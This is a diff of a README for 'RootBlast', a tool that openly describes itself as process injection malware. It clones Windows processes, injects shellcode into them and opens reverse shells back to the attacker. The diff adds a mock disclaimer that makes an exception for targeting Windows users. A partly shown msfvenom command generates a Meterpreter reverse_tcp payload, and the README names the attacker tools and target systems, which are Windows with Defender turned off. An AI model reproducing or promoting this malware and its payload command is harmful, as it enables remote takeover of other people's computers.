@@ -1,9 +1,9 @@
 # RootBlast 🪴 💥
 ![image](https://github.com/Spirizeon/rootblast/assets/123345456/d7600095-f6b4-49b2-bb8f-28c2ce3c07ba)
 
-
 Process injection malware that clones windows processes, injects them with shellcode and executes them to attempt numerous reverse shells on the attacker. (Made with 🤎 for Windows users)
 
+> This is only for educational and research purposes (except if your target are windows users) 
 ## Usage
 + Clone the repo
 ```
@@ -27,5 +27,5 @@ msfvenom --platform windows --arch x64 -p windows/x64/meterpreter/reverse_tcp LH
 
 **Attacker** Kali Linux/ParrotOS VMs, metasploit-framework
 
-**Target:** Windows 7/10/11 (with Windows defender turned off)
+**Target:** Windows 7/10/11 (with Windows defender turned off), Visual C++, C
 
